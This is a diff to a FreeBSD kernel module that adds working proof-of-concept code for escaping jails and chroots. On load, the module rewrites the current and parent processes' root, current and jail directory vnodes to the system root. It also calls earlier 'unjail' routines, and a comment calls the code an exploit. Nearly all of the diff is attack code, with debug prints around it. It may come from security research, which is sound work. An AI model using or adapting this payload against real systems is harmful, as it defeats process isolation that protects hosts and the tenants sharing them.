@@ -6,12 +6,25 @@
 #include <sys/jail.h>
 #include <sys/ucred.h>
 #include <sys/mutex.h>
+#include <sys/filedesc.h>
+#include <sys/vnode.h>
+#include <sys/mount.h>
+#include <sys/fcntl.h>
+#include <sys/namei.h>
 
 extern struct mtx Giant;
 extern struct prison prison0;
 
 void poc_unjail_current_process(void);
 void poc_unjail_parent_process(void);
+void poc_escape_chroot_current_process(void);
+void poc_escape_chroot_parent_process(void);
+
+void print_current_process_jdir(void);
+void print_parent_process_jdir(void);
+void print_jdir(void);
+void print_jail_path(void);
+void print_vnode(void);
 
 void
 poc_unjail_current_process(void)
@@ -95,6 +108,160 @@ poc_unjail_parent_process(void)
     printf("poc_unjail_parent_process: 9\n");
 }
 
+// void poc_escape_chroot(void) {
+//     struct thread *td = curthread;
+//     struct nameidata nd;
+//     struct vnode *vp;
+//     int error;
+
+//     char *path = "/";
+//     NDINIT(&nd, LOOKUP, FOLLOW, UIO_SYSSPACE, path);
+//     error = namei(&nd);
+//     if (error != 0) {
+//       printf("namei() error: %d\n", error);
+//     };
+//     vp = nd.ni_vp;
+
+//     printf("begin: pwd_chroot()\n");
+//     error = pwd_chroot(td, vp);
+//     if (error != 0) {
+//       printf("pwd_chroot() error: %d\n", error);
+//     };
+//     printf("end: pwd_chroot()\n");
+// }
+
+void print_current_process_jdir(void) {
+    struct thread *td = curthread;
+    struct proc   *p  = td->td_proc;
+    struct pwddesc *pdp;
+    struct pwd *pwd;
+
+    printf("pid %d: fetching current pwd...\n", p->p_pid);
+
+    pdp = p->p_pd;
+    /* Step 1: Get SMR-protected pwd pointer */
+    pwd = vfs_smr_entered_load(&pdp->pd_pwd);
+    if (pwd == NULL) {
+        printf("current pwd_get_smr returned NULL\n");
+        return;
+    }
+
+    /* Step 2: Take a stable reference */
+    if (!pwd_hold_smr(pwd)) {
+        printf("current pwd_hold_smr failed\n");
+        return;
+    }
+
+    /* Step 3: Extract jdir vnode safely */
+    struct vnode *jdir = pwd->pwd_jdir;
+    if (jdir == NULL) {
+        printf("current pwd_jdir is NULL\n");
+        pwd_drop(pwd);
+        return;
+    }
+
+    /* Step 4: Extract mount structure */
+    struct mount *mp = jdir->v_mount;
+    if (mp == NULL) {
+        printf("current vnode has no mount point\n");
+        pwd_drop(pwd);
+        return;
+    }
+
+    printf("current jdir mount point: %s\n", mp->mnt_stat.f_mntonname);
+
+    /* Step 5: Release reference */
+    pwd_drop(pwd);
+}
+
+void print_parent_process_jdir(void) {
+    struct thread *td = curthread;
+    struct proc   *p  = td->td_proc;
+    struct proc   *pp;
+    struct pwddesc *pdp;
+    struct pwd *pwd;
+
+    pp = p->p_pptr;
+    printf("pid %d: fetching parent pwd...\n", pp->p_pid);
+
+    pdp = pp->p_pd;
+    /* Step 1: Get SMR-protected pwd pointer */
+    pwd = vfs_smr_entered_load(&pdp->pd_pwd);
+    if (pwd == NULL) {
+        printf("parent pwd_get_smr returned NULL\n");
+        return;
+    }
+
+    /* Step 2: Take a stable reference */
+    if (!pwd_hold_smr(pwd)) {
+        printf("parent pwd_hold_smr failed\n");
+        return;
+    }
+
+    /* Step 3: Extract jdir vnode safely */
+    struct vnode *jdir = pwd->pwd_jdir;
+    if (jdir == NULL) {
+        printf("parent pwd_jdir is NULL\n");
+        pwd_drop(pwd);
+        return;
+    }
+
+    /* Step 4: Extract mount structure */
+    struct mount *mp = jdir->v_mount;
+    if (mp == NULL) {
+        printf("parent vnode has no mount point\n");
+        pwd_drop(pwd);
+        return;
+    }
+
+    printf("parent jdir mount point: %s\n", mp->mnt_stat.f_mntonname);
+
+    /* Step 5: Release reference */
+    pwd_drop(pwd);
+}
+
+void poc_escape_chroot_current_process(void) {
+    struct thread   *td = curthread;
+    struct proc     *p  = td->td_proc;
+    struct pwddesc  *process_pwd_desc;
+
+    process_pwd_desc = p->p_pd;
+    PWDDESC_XLOCK(process_pwd_desc);
+
+    struct pwd *pwdptr = *(struct pwd **)&process_pwd_desc->pd_pwd;
+    pwdptr->pwd_cdir = rootvnode;
+    pwdptr->pwd_rdir = rootvnode;
+    pwdptr->pwd_jdir = rootvnode;
+
+    PWDDESC_XUNLOCK(process_pwd_desc);
+}
+
+void poc_escape_chroot_parent_process(void) {
+    struct thread   *td = curthread;
+    struct proc     *p  = td->td_proc;
+    struct proc   *pp;
+    struct pwddesc  *process_pwd_desc;
+
+    pp = p->p_pptr;
+    process_pwd_desc = pp->p_pd;
+    PWDDESC_XLOCK(process_pwd_desc);
+
+    struct pwd *pwdptr = *(struct pwd **)&process_pwd_desc->pd_pwd;
+    pwdptr->pwd_cdir = rootvnode;
+    pwdptr->pwd_rdir = rootvnode;
+    pwdptr->pwd_jdir = rootvnode;
+
+    PWDDESC_XUNLOCK(process_pwd_desc);
+}
+
+void print_jail_path(void)
+{
+    struct thread *td = curthread;
+    struct ucred *cred = td->td_ucred;
+
+    printf("********** Jail path: %s\n", cred->cr_prison->pr_path);
+}
+
 /*
  * Event handler for the module.
  */
@@ -105,6 +272,10 @@ hello_modevent(module_t mod __unused, int event, void *arg __unused)
     case MOD_LOAD:
         printf("hello: Hello, kernel world!\n");
 
+        printf("begin: print_jail_path() 1\n");
+        print_jail_path();
+        printf("end: print_jail_path() 1\n");
+
         printf("begin: poc_unjail_current_process()\n");
         poc_unjail_current_process();
         printf("end: poc_unjail_current_process()\n");
@@ -112,6 +283,18 @@ hello_modevent(module_t mod __unused, int event, void *arg __unused)
         printf("begin: poc_unjail_parent_process()\n");
         poc_unjail_parent_process();
         printf("end: poc_unjail_parent_process()\n");
+
+        printf("begin: poc_escape_chroot_current_process()\n");
+        poc_escape_chroot_current_process();
+        printf("end: poc_escape_chroot_current_process()\n");
+
+        printf("begin: poc_escape_chroot_parent_process()\n");
+        poc_escape_chroot_parent_process();
+        printf("end: poc_escape_chroot_parent_process()\n");
+
+        printf("begin: print_jail_path() 2\n");
+        print_jail_path();
+        printf("end: print_jail_path() 2\n");
 
         // Clean up from exploit
         printf("begin 1: mtx_unlock() address: %p\n", &Giant);
